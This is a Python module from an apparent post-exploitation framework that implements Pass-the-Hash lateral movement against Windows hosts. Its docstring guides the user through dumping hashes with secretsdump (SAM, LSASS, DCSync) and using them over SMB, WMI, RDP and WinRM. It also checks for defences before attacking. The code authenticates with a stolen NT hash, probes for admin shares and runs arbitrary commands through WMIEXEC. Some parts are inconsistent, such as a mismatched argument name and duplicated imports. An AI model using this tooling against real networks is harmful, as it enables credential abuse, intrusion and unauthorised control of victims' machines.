"""STUB — Pass-the-Hash lateral movement.

Authenticate to remote Windows services using an NT password hash without
ever knowing (or cracking) the plaintext password.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

HOW NTLM AUTHENTICATION WORKS
------------------------------
NTLM never sends the plaintext password across the wire.  The protocol is:
  1. Client → Server:  NEGOTIATE message
  2. Server → Client:  CHALLENGE message (8-byte random nonce)
  3. Client → Server:  AUTHENTICATE message containing:
       NTResponse = HMAC_MD5(NT_hash,
                             HMAC_MD5(NT_hash, challenge || client_challenge)
                             || challenge || client_challenge || ...)

Because only the NT hash is needed to compute the NTResponse, possessing the
hash is equivalent to possessing the password for NTLM authentication.

NT hash derivation (for reference):
  import hashlib
  nt_hash = hashlib.new("md4", password.encode("utf-16-le")).hexdigest()

Hash format used by most tools:  "LM_HASH:NT_HASH"
  The LM hash is almost always the empty-password hash on modern Windows:
    LM  = "aad3b435b51404eeaad3b435b51404ee"
  So a typical hash string looks like:
    "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"


PREREQUISITE: where to get hashes
-----------------------------------
  - From the SAM database (local accounts):
      secretsdump.py -sam SAM -system SYSTEM LOCAL
      Or from a live system (requires admin): secretsdump.py administrator:pass@target
  - From LSASS dump: see post/cred/memory.py
  - From domain controller (DCSync, requires Domain Admin or replication perms):
      secretsdump.py -just-dc domain/administrator:pass@dc_ip


USING IMPACKET (pure Python, no Mimikatz needed)
--------------------------------------------------
pip install impacket

  SMB shell (psexec-style):
    from impacket.examples.psexec import PSEXEC
    # hashes="LM:NT"
    exe = PSEXEC("cmd.exe", "C:\\\\Windows\\\\", None, connection=None,
                 exeArgs="", copyFile=False)

  Simpler — smbexec / wmiexec via command line shim:
    from impacket.examples.smbexec import SMBSERVER   # or use wmiexec

  Direct SMB connection:
    from impacket.smbconnection import SMBConnection
    conn = SMBConnection(target_ip, target_ip, sess_port=445)
    conn.login(
        user="administrator",
        password="",
        domain="WORKGROUP",
        lmhash="aad3b435b51404eeaad3b435b51404ee",
        nthash="<32-char NT hash here>",
    )
    # List shares:
    shares = conn.listShares()
    # Read a file:
    fh = BytesIO()
    conn.getFile("C$", "Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", fh.write)

  WMI command execution (stealthier than psexec — no service creation):
    from impacket.examples.wmiexec import WMIEXEC
    exec_obj = WMIEXEC(
        target=target_ip,
        username="administrator",
        password="",
        domain="CORP",
        hashes="aad3b435...:31d6cfe0...",
        aesKey=None, doKerberos=False, kdcHost=None,
        share="ADMIN$", shell_type="cmd",
    )
    exec_obj.run("whoami", output=True)

  RDP (restricted admin mode):
    mstsc.exe /v:target /restrictedAdmin
    — Works when RestrictedAdmin is enabled (reg key) and PTH is not blocked
    — Python: FreeRDP's libfreerdp with NTLMv2 hash injection

  WinRM (PowerShell remoting):
    from impacket.examples.wmiexec import WMIEXEC  # or pypsrp library
    pip install pypsrp
    from pypsrp.client import Client
    c = Client(target_ip, username="admin", password="",
               auth="ntlm", negotiate=True,
               credssp_auth_mechanism="ntlm",
               # pass NT hash via low-level NTLM config)


MITIGATION CHECKS (run before attempting PTH)
---------------------------------------------
  - Protected Users security group: members cannot authenticate via NTLM.
    Check: `net user <username>` or AD attribute memberOf.
  - Credential Guard (VBS): stores credentials in a Hyper-V isolated process.
    NTLM hashes extracted from LSASS are synthetic and NOT usable for PTH.
    Check: reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity
  - KB2871997 (Windows 8.1+): blocks PTH for non-RID-500 local accounts.
    Domain accounts and the built-in Administrator (RID 500) are still vulnerable.
  - Network Logon disabled via GPO: LocalAccountTokenFilterPolicy=0 blocks remote
    admin shares; set to 1 to re-enable.
    Check: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "target":   "192.168.1.10",
    "username": "administrator",
    "domain":   "CORP",              # or "." for local
    "nt_hash":  "31d6cfe0d16ae931b73c59d7e0c089c0",
    "command":  "whoami",            # command to run on the target
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register



# ── impacket availability ──────────────────────────────────────────────────────

try:
    from impacket.smbconnection import SMBConnection  # type: ignore[import]
    _IMPACKET_OK = True
except ImportError:
    _IMPACKET_OK = False

from post.base import ModuleResult, PostModule
from post.loader import register


def _parse_hash(hash_str: str) -> tuple[str, str]:
    """Parse LM:NT or :NT hash string."""
    parts = hash_str.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    # Assume NT only
    return "aad3b435b51404eeaad3b435b51404ee", parts[0]


def _test_smb_auth(target: str, username: str, lm: str, nt: str,
                   domain: str = "", timeout: int = 5) -> dict:
    """Test SMB authentication with a hash. Returns dict with result."""
    if not _IMPACKET_OK:
        return {"error": "impacket not installed: pip install impacket"}
    try:
        conn = SMBConnection(target, target, timeout=timeout)
        conn.login(username, "", domain=domain, lmhash=lm, nthash=nt)
        is_admin = False
        try:
            conn.connectTree("ADMIN$")
            is_admin = True
        except Exception:
            pass
        conn.logoff()
        return {"success": True, "admin": is_admin}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _exec_command(target: str, username: str, lm: str, nt: str,
                  command: str, domain: str = "") -> dict:
    """Execute a command via WMIEXEC over PTH."""
    try:
        from impacket.examples.secretsdump import RemoteOperations  # noqa: F401
        from impacket.examples import wmiexec  # type: ignore[import]

        class _Args:
            target_ip = target
            share = "ADMIN$"
            nooutput = False
            codec = "utf-8"
            shell_type = "cmd"
            silentcommand = False

        executor = wmiexec.WMIEXEC(
            command, username, "", target, lm, nt, domain,
            share="ADMIN$", noOutput=False
        )
        executor.run(target)
        return {"success": True, "note": "See wmiexec output"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class PassTheHashModule(PostModule):
    NAME        = "lateral/pth"
    DESCRIPTION = "Pass-the-Hash via SMB: authenticate to Windows targets with an NT hash"
    PLATFORM    = ["linux", "darwin", "windows"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        """
        Args:
            target   (str): Target IP or hostname
            username (str): Windows username
            hash     (str): NT hash or LM:NT format
            domain   (str): Domain (optional, default "")
            command  (str): Command to run via WMIEXEC (optional — omit to just test auth)
            timeout  (int): Connection timeout seconds (default 5)
        """
        if not _IMPACKET_OK:
            return ModuleResult(
                ok=False, output="",
                error="impacket not installed. Install with: pip install impacket"
            )

        args = args or {}
        target  = args.get("target", "")
        username = args.get("username", "")
        hash_str = args.get("hash", "")
        domain  = args.get("domain", "")
        command = args.get("command", "")
        timeout = int(args.get("timeout", 5))

        if not target or not username or not hash_str:
            return ModuleResult(
                ok=False, output="",
                error="Required args: target, username, hash (LM:NT or :NT format)"
            )

        lm, nt = _parse_hash(hash_str)
        lines = [f"Target:   {target}", f"Username: {domain}\\{username}" if domain else f"Username: {username}",
                 f"Hash:     {lm}:{nt}", ""]

        auth = _test_smb_auth(target, username, lm, nt, domain, timeout)
        if auth.get("error"):
            return ModuleResult(ok=False, output="\n".join(lines), error=auth["error"])

        if auth["success"]:
            lines.append("✓ Authentication SUCCEEDED")
            lines.append(f"  Admin access: {'YES' if auth.get('admin') else 'no'}")
        else:
            lines.append("✗ Authentication FAILED")
            lines.append(f"  Error: {auth.get('error', 'unknown')}")
            return ModuleResult(ok=True, output="\n".join(lines),
                                data={"success": False, "target": target})

        if command and auth["success"]:
            lines.append(f"\nExecuting: {command}")
            exec_result = _exec_command(target, username, lm, nt, command, domain)
            if exec_result.get("error"):
                lines.append(f"  Exec error: {exec_result['error']}")
            else:
                lines.append("  Command dispatched via WMIEXEC")

        return ModuleResult(
            ok=True,
            output="\n".join(lines),
            data={"success": auth["success"], "admin": auth.get("admin", False),
                  "target": target, "username": username},
        )
